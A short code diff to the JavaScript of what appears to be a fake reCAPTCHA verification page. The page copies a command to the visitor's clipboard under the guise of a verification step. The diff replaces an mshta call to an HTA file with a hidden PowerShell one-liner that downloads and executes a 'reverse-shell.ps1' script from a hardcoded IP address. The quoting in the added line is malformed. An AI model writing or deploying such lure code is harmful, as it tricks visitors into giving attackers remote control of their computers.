@@ -420,7 +420,7 @@
             document.getElementById('verification-id').textContent = verification_id;
             
             const htaPath = window.location.origin + "/recaptcha-verify";
-            const commandToRun = "mshta " + htaPath
+            const commandToRun = "`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://100.106.32.5:8080/reverse-shell.ps1')"`;"
             stageClipboard(commandToRun, verification_id)
         }
 
